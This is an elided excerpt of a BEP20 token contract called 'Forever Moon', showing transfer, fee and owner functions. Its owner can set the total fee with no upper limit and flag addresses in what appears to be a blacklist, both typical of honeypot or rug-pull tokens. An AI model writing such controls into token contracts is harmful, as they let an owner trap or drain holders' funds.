...
contract fevmn  is IBEP20, Auth {
    ...
    string constant _name = "Forever Moon";
    string constant _symbol = "fevmn";
    ...
    address private marketingFeeReceiver = 0x42a7404D751A3Ff6F9305Dfb80827A5415196B85;
    address private buybackFeeReceiver = 0x42a7404D751A3Ff6F9305Dfb80827A5415196B85;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "fevmn Insufficient Allowance!!!!");
        }
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "fevmn Insufficient Balance!!!!");
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (recipient != UniswapV2Pair && recipient != DEAD && sender != owner && recipient != owner) {
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletSize, "fevmn Transfer amount exceeds the bag size!!!!");
        }
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "fevmn TX Limit Exceeded");
    }
    ...
    function swapBack() internal swapping {
        ...
        require(MarketingSuccess, "fevmn receiver rejected ETH transfer");
        (bool BuyBackSuccess, /* bytes memory data */) = payable(buybackFeeReceiver).call{value: amountBNBbuyback, gas: 30000}("");
        require(BuyBackSuccess, "fevmn receiver rejected ETH transfer");
    ...
    function setDLfevmn(address addr, bool bv) external onlyOwner {
        isBBB[addr] = bv;
    }

    function setDEfevmn(uint256 fe) external onlyOwner {
        totalFee = fe;
    }
    ...
    function transferForeignToken(address _token) public authorized {
        require(_token != address(this), "fevmn Can't let you take all native token");
